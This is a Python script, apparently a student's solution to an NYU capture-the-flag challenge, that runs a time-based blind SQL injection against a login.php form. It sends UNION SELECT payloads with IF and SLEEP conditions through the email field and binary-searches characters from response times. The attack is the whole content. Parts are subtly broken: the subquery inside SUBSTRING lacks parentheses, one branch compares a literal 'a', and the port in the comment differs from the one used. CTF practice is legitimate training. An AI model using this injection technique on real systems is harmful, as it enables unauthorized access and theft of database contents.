#!/usr/bin/python
# Objective: log into http://offsec-chalbroker.osiris.cyber.nyu.edu:1240/login.php? as admin

import requests
import time
import math

'''
From experimentation, I found that the login script (PHP) posts the email and password 
to /login.php? as an application/x-www-form-urlencoded form. I replicate this here.
'''
lowerLimit = 48 #char for 0
upperLimit = 126 #char for ~
while True:
    k = int(math.floor((lowerLimit + upperLimit) / 2))
    print(k)
    firstDelay = 2 # SLEEP() delay in seconds for first if
    secondDelay = 4 # SLEEP() delay in seconds for second if
    query = """admin' AND 1=0 
                UNION 
                SELECT 
                    IF(ASCII(SUBSTRING(SELECT SCHEMA_NAME FROM information_schema LIMIT 1, 1, 1)) < {0}, SLEEP({1}), 
                        IF(ASCII(SUBSTRING('a', 1, 1)) > {0}, SLEEP({2}), 0)), 
                null, null LIMIT 1""".format(hex(k), str(firstDelay), str(secondDelay)) # Accept username via terminal

    query += " #"

    print("Full Query: SELECT ... FROM ... WHERE email='" + query)

    '''

    '''

    login = { "email": query, "password": "dummy" } #password does not really matter
    url = "http://offsec-chalbroker.osiris.cyber.nyu.edu:1241/login.php?"
    cookies = dict(CHALBROKER_USER_ID='tk1931') # for admin purposes

    start = time.time()
    r = requests.post(url, data=login, cookies=cookies)
    end = time.time()
    length = end - start
    print("Response Time: " + str(end-start))

    if "No such user" in r.text or r.status_code == 500 : # If it causes a server error or returns back the unsuccessful login
        print("Query Failure")
    elif "assoc" in r.text : #SQL ERROR
        print("SQL ERROR")
    elif "flag" in r.text: # If the successful login screen is shown
        if (length > firstDelay) :
            if (length < secondDelay) :
               print("LESS THAN")
               upperLimit = k - 1
            else :
                print("GREATER THAN")
                lowerLimit = k + 1
            continue
        else :
            print("DONE: " + chr(k))
            break
    else :
        print("Unknown...")
        print(r.text)
        break